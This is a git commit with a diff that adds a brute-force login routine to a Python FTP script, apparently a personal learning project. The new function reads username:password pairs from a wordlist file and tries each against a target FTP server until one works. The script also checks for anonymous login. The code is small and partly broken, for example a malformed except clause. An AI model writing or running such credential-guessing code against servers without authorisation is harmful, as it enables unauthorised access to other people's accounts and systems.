70d464bb0d1b4adbc995643fd9d35e4a817a92e8
sKannanaikal <deenathomas@Seans-iMac.fios-router.home>
2021-06-15 17:53:13 -0400

    created a method to login to the ftp server via bruteforce

--- script.py
+++ script.py
@@ -2,6 +2,7 @@ import ftplib
 import optparse
 
 def loginWithAnonymous(host):
+
     try:
         connection = ftplib.FTP(host)
         connection.login('Anonymous','yolo@gmail.com')
@@ -13,8 +14,29 @@ def loginWithAnonymous(host):
         print("[-] Connection Not Possible via Anonymous Login")
         return False
 
+def loginBruteForce(host, credentials):
+
+    file = open(credentials, 'r')
+
+    for userDetails in file:
+        username = userDetails.split(':')[0]
+        password = userDetails.split(':')[1].strip('\r').strip('\n')
+
+        try:
+            connection = ftplib.FTP(host)
+            connection.login(username, password)
+            print("[+] Login Success! Credentials Found!")
+            connection.quit()
+            return (username, password)
+
+        except e:
+            print("[*] Continuing to Search ...")
+
+    print("[-] Failed to Brute Force into FTP Server")
+    return None
+
 def main():
-    print("Hello World!")
+    command = optparse.OptionParser('usage%prog -h ')
 
 if __name__ == "__main__":
     main()
